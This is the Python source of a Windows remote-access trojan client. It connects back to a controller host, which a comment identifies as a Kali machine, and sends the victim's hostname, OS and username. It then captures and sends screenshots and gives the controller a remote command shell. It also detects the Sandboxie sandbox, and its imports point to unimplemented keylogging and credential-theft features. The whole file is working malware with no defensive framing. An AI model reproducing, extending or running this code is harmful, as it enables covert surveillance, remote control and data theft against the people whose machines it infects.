import socket, os, sys, platform, time, ctypes, subprocess, sqlite3, pyscreeze, threading, pynput.keyboard, wmi
import win32api, winerror, win32event, win32crypt
from shutil import copyfile
from winreg import *

# kali 192.168.85.130
#my 192.168.219.122
TMP = os.environ["TEMP"]
HOST = "127.0.0.1"
PORT = 1234

Path = os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']

buffer = 1024

mutex =  win32event.CreateMutex(None,1,"PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

#check sandbox
def detectSandbox():
    try:
        libhandle = ctypes.windll.LoadLibrary("SbieDll.dll")
        return " (Sandbox ) "
    except: return ""

def detectVM():
    pass


def server_conn():
    print("try conn...\n")
    global global_socket    
    while True:
        try:
            global_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            global_socket.connect((HOST,PORT))

        except socket.error:
            time.sleep(5)
        else:
            break

    userinfo = socket.gethostname() + ", " + platform.system() + ", " + platform.release() \
    + ", " + os.environ["USERNAME"]
    send(str.encode(userinfo))



decode_utf8 = lambda data:data.decode("utf-8")
send = lambda data:global_socket.send(data)
recv = lambda data:global_socket.recv(data)


def screen_shot():
    print("screen")
    pyscreeze.screenshot(TMP+"/s.png")
    print(str(os.path.getsize(TMP+"/s.png")))
    send(str.encode("Receiving screenshot.." + "\n" + "File size: " + str(os.path.getsize(TMP+"/s.png")) + "bytes.."))

    pic = open(TMP+"/s.png","rb")
    time.sleep(1)

    send(pic.read())
    pic.close()


def command_shell():
    current_dir = str(os.getcwd())
    #send(str.encode(current_dir))

    while True:
        send(str.encode(os.getcwd())) # send current dir 
        print(str.encode(os.getcwd()))

        cmd_data = decode_utf8(recv(buffer)) # recv command
        input_command = cmd_data.split(" ")
        
        if cmd_data == "exit_cmd":
            os.chdir(current_dir)
            break
        elif input_command[0] =="cd":
            os.chdir(input_command[1])
        else:
            output     = subprocess.Popen(input_command,stdout = subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE,shell=True)
            out,err = output.communicate()
            
            #send(str(len(out)).encode()) #size send
            time.sleep(1)
            print(out)
            print(type(out))
            send((out))



server_conn()
print("\nsuccess\n")
while True:
    try:
        while True:
            Data = recv(buffer)
            Data = decode_utf8(Data)

            if(Data=="exit"):
                global_socket.close()
                sys.exit(0)
            elif Data=="screen_shot":
                screen_shot()
            elif Data == "cmd":
                command_shell()
    except socket.error:
        global_socket.close()
        del global_socket
        server_conn()


